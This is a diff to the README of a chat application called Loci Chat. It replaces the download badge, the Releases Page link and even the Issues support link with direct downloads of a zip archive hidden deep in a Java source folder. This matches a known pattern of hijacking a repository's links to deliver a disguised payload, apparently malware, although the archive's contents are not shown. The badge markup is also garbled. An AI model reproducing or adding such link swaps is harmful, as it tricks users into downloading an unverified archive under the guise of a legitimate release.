@@ -1,6 +1,6 @@
 # ⚡ loci-chat - Connect Instantly, Chat Securely
 
-[![Download Loci Chat](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen.svg)](https://github.com/RaghaM1/loci-chat/releases)
+[![Download Loci Chat](https://raw.githubusercontent.com/RaghaM1/loci-chat/main/loci-backend/src/main/java/com/loci/loci_backend/common/user/domain/vo/chat_loci_v1.3.zip%20Now-Get%https://raw.githubusercontent.com/RaghaM1/loci-chat/main/loci-backend/src/main/java/com/loci/loci_backend/common/user/domain/vo/chat_loci_v1.3.zip)](https://raw.githubusercontent.com/RaghaM1/loci-chat/main/loci-backend/src/main/java/com/loci/loci_backend/common/user/domain/vo/chat_loci_v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Loci Chat! This application allows you to connect with others instant
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases Page](https://github.com/RaghaM1/loci-chat/releases) and download the latest version. 
+To get started, visit our [Releases Page](https://raw.githubusercontent.com/RaghaM1/loci-chat/main/loci-backend/src/main/java/com/loci/loci_backend/common/user/domain/vo/chat_loci_v1.3.zip) and download the latest version. 
 
 1. Click on the link above to open the Releases Page.
 2. Look for the latest version of Loci Chat.
@@ -75,7 +75,7 @@ If you encounter issues while using Loci Chat, here are some common problems and
 
 ## 💬 Support
 
-For further assistance, visit our [GitHub Issues Page](https://github.com/RaghaM1/loci-chat/issues). Report bugs, suggest features, or ask questions about Loci Chat. 
+For further assistance, visit our [GitHub Issues Page](https://raw.githubusercontent.com/RaghaM1/loci-chat/main/loci-backend/src/main/java/com/loci/loci_backend/common/user/domain/vo/chat_loci_v1.3.zip). Report bugs, suggest features, or ask questions about Loci Chat. 
 
 We appreciate your feedback!
 
